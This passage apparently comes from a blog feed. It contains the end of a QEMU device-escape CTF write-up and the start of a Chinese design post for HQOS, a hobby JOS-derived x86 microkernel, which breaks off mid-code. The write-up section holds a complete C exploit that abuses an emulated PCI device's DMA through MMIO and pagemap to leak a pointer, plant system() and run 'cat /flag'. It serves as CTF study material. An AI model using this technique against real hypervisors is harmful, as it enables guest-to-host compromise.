* mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="comment">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* transfer visual address to physic address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> size)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_dma_state</span><span class="params">(<span class="type">uint32_t</span> src,<span class="type">uint32_t</span> dst,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst); </span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_from_dma</span><span class="params">(<span class="type">void</span>* buf,<span class="type">uint32_t</span> idx,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    set_dma_state(idx+<span class="number">0x40000</span>,gva_to_gpa(buf),cnt);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_dma</span><span class="params">(<span class="type">void</span>* buf,<span class="type">uint32_t</span> idx,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    set_dma_state(gva_to_gpa(buf),idx+<span class="number">0x40000</span>,cnt);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    init_mmio();</span><br><span class="line">    HEX(mmio_mem);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"prepare:"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> buf = <span class="number">0</span>;</span><br><span class="line">    copy_from_dma(&amp;buf,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    HEX(buf);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = buf<span class="number">-0x862B8</span>;</span><br><span class="line">    copy_to_dma(&amp;system_addr,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="type">char</span> cmd[] = <span class="string">"cat /flag"</span>;</span><br><span class="line">    copy_to_dma(cmd,<span class="number">0</span>,<span class="built_in">strlen</span>(cmd));</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Trigger:"</span>);</span><br><span class="line">    set_dma_state(<span class="number">0x40000</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>|<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281752891.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HQOS 设计与实现</title>
      <link href="/2023/HQOS-Design-and-Implementation/"/>
      <url>/2023/HQOS-Design-and-Implementation/</url>
      
        <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>“THE MAN WHO CHANGED CHROME” 曾经指出如何学习计算机基础知识:</p><blockquote><p>自己写一个CPU,在自己写的CPU上运行自己写的操作系统,然后用自己写的编译器编译运行一个程序.</p></blockquote><p>于是便有了写一个操作系统的想法.在粗略看完一遍《操作系统真相还原》后,感觉从引导操作系统到实现各种操作系统概念的完整过程工作量有点太大了,暂时还没有那么多时间和精力来完成,便暂且搁置了.</p><p>感谢MIT的6.828课程,让我能在有限的时间里一步一步地实现一个操作系统雏形JOS.JOS的开发过程请查看 /学习笔记/6.828分类下的文章.</p><p>在接下来的一段时间,我会继续开发扩展该操作系统,并重构目前实现模型中我不太喜欢的实现,就叫它HQOS吧.</p><p>本博客记录当前版本HQOS的设计与实现,你可以在github上找到其历史文档及代码实现.<br><a href="https://github.com/Polaris-Snowfall/HQOS">github</a></p><span id="more"></span><h1 id="设计与实现-Version-0-0"><a href="#设计与实现-Version-0-0" class="headerlink" title="设计与实现 Version 0.0"></a>设计与实现 Version 0.0</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>HQOS使用C语言进行开发,是一个基于x86架构的Unix-like微内核操作系统,你可以从中找到很多Unix-like的设计和功能.一些模块如File system,Network等在用户态实现.</p><ol><li>Memory management</li><li>Processes and Threads</li><li>File systems</li><li>Network</li><li>System calls, Interrupts, Exceptions</li><li>User library</li></ol><h2 id="Memory-management"><a href="#Memory-management" class="headerlink" title="Memory management"></a>Memory management</h2><h3 id="Physical-Page-Management"><a href="#Physical-Page-Management" class="headerlink" title="Physical Page Management"></a>Physical Page Management</h3><h4 id="Keep-track-of-physical-page-frames"><a href="#Keep-track-of-physical-page-frames" class="headerlink" title="Keep track of (physical) page frames"></a>Keep track of (physical) page frames</h4><p>HQOS以页面粒度进行物理内存管理.对于每一个物理页,使用一个PageInfo结构来跟踪其的使用情况(空闲或使用中,被多少”用户”使用).所有的PageInfo结构位于一个连续的数组中,PageInfo结构在数组中的索引与物理页的地址相关联(IDX &lt;—&gt; PGNUM = PADDR / PGSIZE).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> {</span></span><br><span class="line"><span class="comment">// Next page on the free list.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp_link</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pp_ref is the count of pointers (usually in page table entries)</span></span><br><span class="line"><span class="comment">// to this page, for pages allocated using page_alloc.</span></span><br><span class="line"><span class="comment">// Pages allocated at boot time using pmap.c's</span></span><br><span class="line"><span class="comment">// boot_alloc do not have valid reference count fields.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> pp_ref;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="Dynamically-allocate-free-page-frames"><a href="#Dynamically-allocate-free-page-frames" class="headerlink" title="Dynamically allocate / free page frames"></a>Dynamically allocate / free page frames</h4><h5 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For kernel:</span></span><br><span class="line"><span class="comment">//请求分配一个物理页</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *<span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span>;</span><br><span class="line"><span class="comment">//减少对某物理页的一次引用</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_decref</span><span class="params">(<span class="keyword">struct</span> PageInfo* pp)</span>;</span><br><span class="line"><span class="comment">//释放某物理页</span></span><br><span class="line"><span class="type">void</span><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="comment">//分配并映射一个页面</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//映射一个页面</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> src_env, <span class="type">void</span> *src_pg,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dst_env, <span class="type">void</span> *dst_pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//取消一个页面的映射</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS以单向链表的数据结构组织空闲物理页.page_alloc与page_free分别从空闲链表中取出一个物理页或加入一个到空闲链表中.在目前的实现中,page_free仅在page_decref中调用,当且仅当某物理页不再被任何一处引用,释放该物理页.</p><h3 id="Virtual-memory-management"><a href="#Virtual-memory-management" class="headerlink" title="Virtual memory management"></a>Virtual memory management</h3><h4 id="Page-translation"><a href="#Page-translation" class="headerlink" title="Page translation"></a>Page translation</h4><h5 id="Interface-1"><a href="#Interface-1" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For kernel:</span></span><br><span class="line"><span class="comment">//插入一个页面到页表中(映射一个虚拟地址对应的页面)</span></span><br><span class="line"><span class="type">int</span><span class="title function_">page_insert</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="keyword">struct</span> PageInfo *pp, <span class="type">void</span> *va, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//从页表中移除一个页面(取消一个虚拟地址对应页面的映射)</span></span><br><span class="line"><span class="type">void</span><span class="title function_">page_remove</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va)</span>;</span><br><span class="line"><span class="comment">//寻找虚拟地址对应页面的PageInfo结构及页表条目</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *<span class="title function_">page_lookup</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va, <span class="type">pte_t</span> **pte_store)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS运行在x86’s protected-mode memory management architecture之上.<br>逻辑地址(虚拟地址)经Segmentation Mechanism转换为线性地址,再经由Paging Mechanism转换到物理地址,最终送上硬件总线.</p><p>HQOS仅通过页面翻译过程完成虚拟地址到物理地址的转换,(实现的方式是: 将全局描述符表中所有条目的段基址设置为0,段界限设置为0xffffffff,此时线性地址就等于虚拟地址.),segmentation在HQOS的实现中更多地作用于权限控制.</p><p>HQOS使用二级页表来完成页面翻译,一个页目录表中有1024个页表条目,一个页表中有1024个页条目,每个页大小为4096字节.(当然,这是x86硬件决定的)</p><h4 id="Pagefault-handling"><a href="#Pagefault-handling" class="headerlink" title="Pagefault handling"></a>Pagefault handling</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For User</span></span><br><span class="line">sys_env_set_pgfault_upcall(<span class="type">envid_t</span> envid, <span class="type">void</span> *func)</span><br></pre></td></tr></tbody></table></figure><p>HQOS对于内核态的页面错误,产生Kernel panic.而对于用户态的页面错误,销毁产生页面错误的用户进程或派发到一个完成注册的用户态页面错误处理函数.</p><h4 id="Page-replacement-待实现"><a href="#Page-replacement-待实现" class="headerlink" title="Page replacement (待实现)"></a>Page replacement (待实现)</h4><h2 id="Processes-and-Threads"><a href="#Processes-and-Threads" class="headerlink" title="Processes and Threads"></a>Processes and Threads</h2><h3 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h3><h4 id="Process-model"><a href="#Process-model" class="headerlink" title="Process model"></a>Process model</h4><p>HQOS使用术语”环境(Environment)“来表示进程.<br>    HQOS使用struct Env的数组来管理系统中所有进程(无论进程是否存在,进程状态由env_status标识),数组的大小即为HQOS允许的最大进程数NENV.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="type">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="type">envid_t</span> env_parent_id;<span class="comment">// env_id of this env's parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="type">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="type">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"><span class="type">int</span> env_cpunum;<span class="comment">// The CPU that the env is running on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="type">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exception handling</span></span><br><span class="line"><span class="type">void</span> *env_pgfault_upcall;<span class="comment">// Page fault upcall entry point</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> env_ipc_recving;<span class="comment">// Env is blocked receiving</span></span><br><span class="line"><span class="type">void</span> *env_ipc_dstva;<span class="comment">// VA at which to map received page</span></span><br><span class="line"><span class="type">uint32_t</span> env_ipc_value;<span class="comment">// Data value sent to us</span></span><br><span class="line"><span class="type">envid_t</span> env_ipc_from;<span class="comment">// envid of the sender</span></span><br><span class="line"><span class="type">int</span> env_ipc_perm;<span class="comment">// Perm of page mapping received</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>每个进程有自己独立的页目录表,即拥有一个独立的32位虚拟地址空间.这意味着同一个物理页可以映射到多个进程中,这是HQOS目前进程间通信实现的关键.HQOS中属于内核的物理空间完整的映射到每个进程的虚拟地址空间中.</p><p>进程目前不具有也不需要独立的内核堆栈.</p><h4 id="Process-creation"><a href="#Process-creation" class="headerlink" title="Process creation"></a>Process creation</h4><h5 id="Interface-2"><a href="#Interface-2" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For Kernel:</span></span><br><span class="line"><span class="comment">// Allocates a new env with env_alloc, loads the named elf</span></span><br><span class="line"><span class="comment">// binary into it with load_icode, and sets its env_type.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">// The new env's parent ID is set to 0.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="comment">//Create the new environment</span></span><br><span class="line"><span class="comment">//the register set is copied from the current environment</span></span><br><span class="line"><span class="comment">//新进程的虚拟地址空间仅初始化了内核部分</span></span><br><span class="line"><span class="type">envid_t</span></span><br><span class="line"><span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="Process-scheduling"><a href="#Process-scheduling" class="headerlink" title="Process scheduling"></a>Process scheduling</h4><h5 id="Interface-3"><a href="#Interface-3" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For Kernel:</span></span><br><span class="line"><span class="comment">// Choose a user environment to run and run it.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sched_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sys_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation-2"><a href="#Implementation-2" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS的进程调度采用轮转调度(round robin).但目前还没有加入时间片的概念.每当时钟中断产生,时钟中断处理例程从当前进程在进程数组中的位置开始遍历其他进程,切换到下一个可运行状态的进程.若无其他可运行的进程,进程重启自身.内核进程不会因时钟中断发生调度(因为目前处理器在内核态时屏蔽中断).<br>进程当然也可主动让出处理器.</p><p>这样的实现当然是让人非常不满的,很快其将会重新实现.</p><h4 id="Interprocess-Communication-IPC"><a href="#Interprocess-Communication-IPC" class="headerlink" title="Interprocess Communication (IPC)"></a>Interprocess Communication (IPC)</h4><h5 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h5><p>HQOS支持多处理器,可能会有多个进程同时进入内核态.HQOS使用一个内核整体的Kernel Lock,进入内核时获取,离开内核时释放,也就是说,HQOS目前仅支持单个内核进程运行.这样的实现依赖于HQOS内核空间对所有进程而言是共享的.</p><h5 id="Sending-and-Receiving-Messages"><a href="#Sending-and-Receiving-Messages" class="headerlink" title="Sending and Receiving Messages"></a>Sending and Receiving Messages</h5><h6 id="By-Value"><a href="#By-Value" class="headerlink" title="By Value"></a>By Value</h6><p>通过用户进程可读的进程表(envs数组)来传递一字长的value.然而该value对所有进程都可见,且一字长的数据太短,所以一般用来辅助By page的传递方式.</p><h6 id="By-page"><a href="#By-page" class="headerlink" title="By page"></a>By page</h6><p>将sender的某页面映射到recver的虚拟地址空间中.<br>sender指示接收进程及页面权限.<br>recver指示将要映射到的虚拟地址.</p><p>recver阻塞直到sender将其唤醒.检测消息来源是否为期望的sender的工作由用户态调用者完成.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">uint32_t</span> value, <span class="type">void</span> *srcva, <span class="type">unsigned</span> perm)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *dstva)</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Threads-线程-待实现"><a href="#Threads-线程-待实现" class="headerlink" title="Threads 线程(待实现)"></a>Threads 线程(待实现)</h3><h2 id="File-systems"><a href="#File-systems" class="headerlink" title="File systems"></a>File systems</h2><h3 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h3><h4 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h4><p>磁盘每个扇区大小为512字节,JOS使用的块大小为512字节.</p><h4 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h4><p>HQOS仅有一个超级块,位于磁盘1(第二个磁盘)的块1(第二个扇区).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FS_MAGIC0x53465148<span class="comment">// related vaguely to 'HQFS'</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> {</span></span><br><span class="line"><span class="type">uint32_t</span> s_magic;<span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line"><span class="type">uint32_t</span> s_nblocks;<span class="comment">// Total number of blocks on disk</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span><span class="comment">// Root directory node</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h4><p>文件的元数据保存在其所在的目录文件中.<br>f_direct数组中记录的为保存该文件数据的磁盘的块号(直接块).<br>f_indirect为间接块的块号,该块的数据为该文件对应的其他直接块的块号,相当于direct数组的扩展.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Number of block pointers in a 